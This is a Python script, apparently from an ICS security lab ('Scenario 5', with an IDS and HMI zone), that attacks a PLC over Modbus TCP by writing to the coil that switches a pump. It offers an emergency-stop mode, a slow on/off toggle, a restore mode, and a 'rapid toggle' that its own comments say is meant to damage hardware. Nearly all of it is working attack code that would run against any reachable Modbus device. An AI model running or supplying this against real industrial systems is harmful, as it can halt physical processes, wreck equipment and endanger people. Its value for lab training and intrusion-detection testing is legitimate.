#!/usr/bin/env python3
"""
Single Modbus Coil Attack
시나리오 5: 부분적 제어 교란 (국소 Pump ON/OFF 조작)

공격 유형:
- emergency_stop: Pump Coil OFF로 강제 (비상 정지 시뮬레이션)
- pump_toggle: Pump를 반복적으로 ON/OFF (시스템 교란)
- rapid_toggle: 빠른 ON/OFF 반복 (하드웨어 손상 유도)
- restore: Pump Coil을 ON으로 복구

Target:
- PLC Server (Modbus TCP)
- Coil 0: Pump ON/OFF
"""

import argparse
import sys
import time
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

class CoilAttack:
    def __init__(self, host='localhost', port=502):
        """
        Modbus Coil 공격 초기화

        Args:
            host: PLC 서버 IP
            port: Modbus TCP 포트
        """
        self.host = host
        self.port = port
        self.client = None

        # Coil 주소
        self.PUMP_COIL = 0

        # 통계
        self.stats = {
            'writes_success': 0,
            'writes_failed': 0,
            'total_attempts': 0
        }

    def connect(self):
        """PLC 서버 연결"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                print(f"[+] Connected to PLC: {self.host}:{self.port}")
                return True
            else:
                print(f"[!] Failed to connect to {self.host}:{self.port}")
                return False
        except Exception as e:
            print(f"[!] Connection error: {e}")
            return False

    def disconnect(self):
        """연결 종료"""
        if self.client:
            self.client.close()
            print("[+] Disconnected from PLC")

    def read_coil(self, address):
        """Coil 상태 읽기"""
        try:
            result = self.client.read_coils(address, 1)
            if not result.isError():
                return result.bits[0]
            else:
                print(f"[!] Error reading coil {address}")
                return None
        except Exception as e:
            print(f"[!] Read error: {e}")
            return None

    def write_coil(self, address, value):
        """Coil 쓰기"""
        try:
            result = self.client.write_coil(address, value)
            self.stats['total_attempts'] += 1

            if not result.isError():
                self.stats['writes_success'] += 1
                return True
            else:
                self.stats['writes_failed'] += 1
                print(f"[!] Error writing coil {address}")
                return False
        except Exception as e:
            self.stats['writes_failed'] += 1
            print(f"[!] Write error: {e}")
            return False

    def attack_emergency_stop(self):
        """
        비상 정지 공격
        Pump Coil을 OFF로 강제 설정
        """
        print("\n" + "="*60)
        print("Attack Mode: EMERGENCY STOP")
        print("="*60)
        print("Target: Coil 0 (Pump)")
        print("Action: Force OFF\n")

        # 현재 상태 확인
        current_state = self.read_coil(self.PUMP_COIL)
        if current_state is not None:
            print(f"[*] Current Pump state: {'ON' if current_state else 'OFF'}")

        # OFF로 강제 설정
        print("[*] Setting Pump to OFF...")
        if self.write_coil(self.PUMP_COIL, False):
            print("[+] Pump stopped (Coil 0 = OFF)")

            # 결과 확인
            new_state = self.read_coil(self.PUMP_COIL)
            if new_state is not None:
                print(f"[+] Verified: Pump is now {'ON' if new_state else 'OFF'}")
        else:
            print("[!] Attack failed")

    def attack_restore(self):
        """
        복구 공격
        Pump Coil을 ON으로 복구
        """
        print("\n" + "="*60)
        print("Attack Mode: RESTORE")
        print("="*60)
        print("Target: Coil 0 (Pump)")
        print("Action: Restore to ON\n")

        # 현재 상태 확인
        current_state = self.read_coil(self.PUMP_COIL)
        if current_state is not None:
            print(f"[*] Current Pump state: {'ON' if current_state else 'OFF'}")

        # ON으로 복구
        print("[*] Restoring Pump to ON...")
        if self.write_coil(self.PUMP_COIL, True):
            print("[+] Pump restored (Coil 0 = ON)")

            # 결과 확인
            new_state = self.read_coil(self.PUMP_COIL)
            if new_state is not None:
                print(f"[+] Verified: Pump is now {'ON' if new_state else 'OFF'}")
        else:
            print("[!] Restore failed")

    def attack_pump_toggle(self, duration=60, interval=5):
        """
        Pump 토글 공격
        일정 간격으로 ON/OFF 반복

        Args:
            duration: 공격 지속 시간 (초)
            interval: ON/OFF 전환 간격 (초)
        """
        print("\n" + "="*60)
        print("Attack Mode: PUMP TOGGLE")
        print("="*60)
        print("Target: Coil 0 (Pump)")
        print(f"Duration: {duration} seconds")
        print(f"Interval: {interval} seconds\n")

        start_time = time.time()
        toggle_state = False  # 시작은 OFF

        try:
            while (time.time() - start_time) < duration:
                # 상태 전환
                toggle_state = not toggle_state
                state_str = "ON" if toggle_state else "OFF"

                print(f"[*] Setting Pump to {state_str}...")
                if self.write_coil(self.PUMP_COIL, toggle_state):
                    print(f"[+] Pump set to {state_str}")
                else:
                    print(f"[!] Failed to set Pump to {state_str}")

                # 현재 상태 확인
                current = self.read_coil(self.PUMP_COIL)
                if current is not None:
                    actual_state = "ON" if current else "OFF"
                    if actual_state != state_str:
                        print(f"[!] Warning: Expected {state_str}, but PLC shows {actual_state}")

                # 다음 전환까지 대기
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                if remaining > interval:
                    print(f"[*] Waiting {interval}s... (Total elapsed: {elapsed:.1f}s)\n")
                    time.sleep(interval)
                else:
                    break

        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")

        print(f"\n[+] Attack completed (Duration: {time.time() - start_time:.1f}s)")

    def attack_rapid_toggle(self, duration=30, interval=0.5):
        """
        빠른 토글 공격
        매우 짧은 간격으로 ON/OFF 반복 (하드웨어 손상 유도)

        Args:
            duration: 공격 지속 시간 (초)
            interval: ON/OFF 전환 간격 (초)
        """
        print("\n" + "="*60)
        print("Attack Mode: RAPID TOGGLE (Hardware Stress)")
        print("="*60)
        print("Target: Coil 0 (Pump)")
        print(f"Duration: {duration} seconds")
        print(f"Interval: {interval} seconds")
        print("⚠️  WARNING: This may cause hardware damage!\n")

        start_time = time.time()
        toggle_state = False
        toggle_count = 0

        try:
            while (time.time() - start_time) < duration:
                # 상태 전환
                toggle_state = not toggle_state

                if self.write_coil(self.PUMP_COIL, toggle_state):
                    toggle_count += 1
                    if toggle_count % 10 == 0:  # 10번마다 출력
                        elapsed = time.time() - start_time
                        print(f"[+] Toggles: {toggle_count} (Elapsed: {elapsed:.1f}s)")

                time.sleep(interval)

        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")

        elapsed = time.time() - start_time
        print(f"\n[+] Attack completed")
        print(f"    Total toggles: {toggle_count}")
        print(f"    Duration: {elapsed:.1f}s")
        print(f"    Average rate: {toggle_count/elapsed:.1f} toggles/sec")

    def show_stats(self):
        """통계 출력"""
        print("\n" + "="*60)
        print("Attack Statistics")
        print("="*60)
        print(f"Total write attempts:  {self.stats['total_attempts']}")
        print(f"Successful writes:     {self.stats['writes_success']}")
        print(f"Failed writes:         {self.stats['writes_failed']}")

        if self.stats['total_attempts'] > 0:
            success_rate = (self.stats['writes_success'] / self.stats['total_attempts']) * 100
            print(f"Success rate:          {success_rate:.1f}%")
        print("="*60)


def main():
    parser = argparse.ArgumentParser(
        description='Single Modbus Coil Attack - Scenario 5',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  emergency_stop - Force Pump OFF (emergency stop simulation)
  pump_toggle    - Toggle Pump ON/OFF repeatedly (system disruption)
  rapid_toggle   - Fast ON/OFF toggles (hardware stress attack)
  restore        - Restore Pump to ON (recovery)

Examples:
  # Emergency stop attack
  python3 coil_single_attack.py --host localhost --attack emergency_stop

  # Pump toggle attack (60 seconds, 5 second intervals)
  python3 coil_single_attack.py --host localhost --attack pump_toggle --duration 60 --interval 5

  # Rapid toggle attack (30 seconds, 0.5 second intervals)
  python3 coil_single_attack.py --host localhost --attack rapid_toggle --duration 30 --interval 0.5

  # Restore pump to normal
  python3 coil_single_attack.py --host localhost --attack restore

Scenario 5: Single Modbus Coil Overwrite
- Zone C주도 (Control Zone)
- Zone B 탐지 (Integration Zone - IDS)
- Zone A 시각화 (Bridge Zone - HMI)
        """)

    parser.add_argument('--host', default='localhost',
                       help='PLC server IP (default: localhost)')
    parser.add_argument('--port', type=int, default=502,
                       help='Modbus TCP port (default: 502)')
    parser.add_argument('--attack',
                       choices=['emergency_stop', 'pump_toggle', 'rapid_toggle', 'restore'],
                       required=True,
                       help='Attack mode')
    parser.add_argument('--duration', type=int, default=60,
                       help='Attack duration in seconds (for toggle attacks, default: 60)')
    parser.add_argument('--interval', type=float, default=5.0,
                       help='Toggle interval in seconds (default: 5.0)')

    args = parser.parse_args()

    print("="*60)
    print("Single Modbus Coil Attack - Scenario 5")
    print("⚠️  Educational purposes only!")
    print("="*60)

    # 공격 객체 생성
    attacker = CoilAttack(host=args.host, port=args.port)

    # 연결
    if not attacker.connect():
        sys.exit(1)

    try:
        # 공격 모드별 실행
        if args.attack == 'emergency_stop':
            attacker.attack_emergency_stop()

        elif args.attack == 'restore':
            attacker.attack_restore()

        elif args.attack == 'pump_toggle':
            attacker.attack_pump_toggle(
                duration=args.duration,
                interval=args.interval
            )

        elif args.attack == 'rapid_toggle':
            attacker.attack_rapid_toggle(
                duration=args.duration,
                interval=args.interval
            )

    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # 통계 출력
        attacker.show_stats()

        # 연결 종료
        attacker.disconnect()


if __name__ == '__main__':
    main()
